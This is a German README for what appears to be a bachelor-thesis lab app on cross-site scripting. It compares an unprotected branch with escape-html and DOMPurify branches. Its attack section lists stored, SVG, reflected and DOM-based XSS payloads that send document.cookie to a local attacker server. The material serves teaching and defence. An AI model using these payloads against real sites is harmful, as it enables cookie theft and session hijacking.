# Webanwendung zur Analyse und Prävention von Cross-Site-Scripting (XSS) Angriffen

Diese Webanwendung wurde im Rahmen einer Bachelorarbeit entwickelt, um XSS-Schwachstellen zu identifizieren und effektive Gegenmaßnahmen zu implementieren. Die Anwendung bietet eine Plattform, auf der verschiedene XSS-Angriffsszenarien simuliert und getestet werden können.

## Inhalt
- [Einleitung](#einleitung)
- [Technologie-Stack](#technologie-stack)
- [Installation](#installation)
- [Nutzung](#nutzung)
- [Struktur der Anwendung](#struktur-der-anwendung)
- [Mögliche Attacken](#xss-schwachstellen-und-gegenmaßnahmen)
- [Fazit](#fazit)
- [Lizenz](#lizenz)

## Einleitung

Diese Anwendung dient als Demonstrations- und Testumgebung für verschiedene XSS-Angriffe und die dazugehörigen Schutzmaßnahmen. 
Sie wurde entwickelt, um die Sicherheitsanforderungen moderner Webanwendungen zu untersuchen und um praxisnahe Lösungen für XSS-Probleme zu bieten.


## Technologie-Stack

### Backend
- **Node.js**: Laufzeitumgebung für serverseitiges JavaScript
- **Express.js**: Webframework für Node.js zur Erstellung von Webanwendungen und APIs
- **MongoDB**: NoSQL-Datenbank zur Speicherung von Daten
- **Mongoose**: Objekt-Datenmodellierungstool für MongoDB und Node.js

### Frontend
- **HTML**: Strukturierung der Webseite
- **CSS**: Gestaltung der Webseite
- **Bootstrap**: CSS-Framework zur schnellen Gestaltung von responsiven Webanwendungen

## Installation

1. **Repository klonen:**
   ```bash
   git clone https://github.com/Bemast3r/XSS.git
2. **Ordner wechsel**
   ```bash
   cd XSS
3.  **Alles nötige installieren:**
    ```bash
    npm run update
4. **Server starten:**
Der Befehl `npm start` im Root-Ordner startet sowohl den Angreifer-Server als auch den Webanwendungs-Server:
    ```bash
    npm run start
Für das jeweilige Starten der Server kann dies erreicht werden in dem man in den jeweiligen Ordner gewechselt wird.
### Nutzung
Diese Webanwendung bietet die Möglichkeit, zwischen verschiedenen Branches zu wechseln, die unterschiedliche XSS-Gegenmaßnahmen implementieren:

- main Branch: Keine Gegenmaßnahme implementiert. Dieser Branch dient als Ausgangspunkt zur Untersuchung von XSS-Angriffen ohne Schutzmechanismen.
- html-escape Branch: In diesem Branch wird die Bibliothek escape-html verwendet, um Benutzereingaben zu entschärfen und somit XSS-Angriffe zu verhindern.
- DOMPURIFY Branch: Dieser Branch verwendet die Bibliothek DOMPurify, um potenziell gefährliche HTML-Eingaben zu bereinigen und XSS-Angriffe zu verhindern.

### Strucktur der Anwendung
- Attacker : Beinhaltet den Hacker Server
- backend: Ist der Backend Server der Webanwendung
- frontend: Ist das Frontend und beinhaltet die HTML Seiten

### Mögliche Attacken

- Stored XSS 
    - Ort: Biografiefeld im User Profile
    - Test-XSS-Payload: 
        - ``<img src="invalid_image.png" onerror="this.src='http://localhost:4000/xss_bild?cookie=' + encodeURIComponent(document.cookie);">``

- Stored XSS via SVG
    - Ort: Community.html
    - Vorbereitung:
      Zuerst muss eine SVG-Datei erstellt werden:
    - Test-XSS-SVG-Payload:
        ```html
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
            <image xlink:href="x" onerror="javascript:window.location='http://localhost:4000/xss_bild?cookie=' + encodeURIComponent(document.cookie);"/>
        </svg>
        ```
    - Anschließend diese Datei über das Uploadfeld hochladen

- Reflected XSS
        - Ort: Search 
    - Test-XSS-Payload: 
        - ``<audio src=1 href=1 onerror="javascript:http://localhost:4000/xss_bild?cookie=' + encodeURIComponent(document.cookie);"></audio>``
- DOM-BASED XSS
        - Ort: EchoInput - Eingabefeld
    - Test-XSS-Payload: 
        - In Browser Suchleiste:    
            - ``http://localhost:3000/Echoinput.html?input=%3Cimg+src%3D+%22keinbild%22onerror%3D%22javascript%3Awindow.location%3D%27http%3A%2F%2Flocalhost%3A4000%2Fxss%3Fcookie%3D%27+%2B+encodeURIComponent%28document.cookie%29%3B%22%3E%3C%2Fimg%3E``

### Lizenz
Dieses Projekt ist unter der MIT-Lizenz lizenziert.
